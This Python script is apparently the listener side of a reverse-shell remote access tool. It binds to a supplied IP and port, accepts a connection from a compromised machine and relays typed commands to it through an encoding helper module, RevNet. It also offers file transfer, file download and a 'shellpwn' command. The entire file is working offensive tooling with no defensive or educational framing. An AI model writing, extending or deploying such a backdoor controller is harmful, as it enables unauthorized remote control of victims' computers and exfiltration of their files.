#!/usr/bin/python3
import socket
import sys
import time
import _thread
import RevNet

def nop():

	return 0

if(len(sys.argv)!=3):

	print("Usage "+sys.argv[0]+" <ip> <port>")

	exit()

def smake():

    try:

        global host

        global port

        global s

        host=sys.argv[1]

        port=int(sys.argv[2])

        s=socket.socket()

    except socket.error as msg:
        print(str(msg))

def sbind():

    try:

        global host

        global port

        global s

        print("Binding to: "+str(port))

        s.bind((host,port))

        s.listen(5)
        
    except socket.error as msg:

        print(str(msg))

def saccept():

    try:

        global c,addr

        c,addr=s.accept()

        print("Connected: "+addr[0]+":"+str(addr[1]))

        passcmd()

        c.close()

    except socket.error as msg:

        print(str(msg))

def passcmd():

    global c

    global s

    while True:

        cmd=input()

        if cmd=='quit':

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            c.close()

            s.close()

            sys.exit()

        elif cmd[:6]=="ftrans":

            RevNet.send_all(c,str.encode(RevNet.enc("ftrans")))

            RevNet.ftrans(c,cmd[7:])

        elif cmd[:8]=="download":

            fname=input("File Name:")

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            RevNet.send_all(c,str.encode(RevNet.enc(fname)))

            print(RevNet.recv_all(c).decode())

        elif cmd[:8]=="shellpwn":

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            print(RevNet.dec(RevNet.recv_all(c).decode()))

        elif len(str.encode(cmd))>0:

            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))

            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))

            print(crecv, end="")

def main():

    smake()
    sbind()
    saccept()

main()
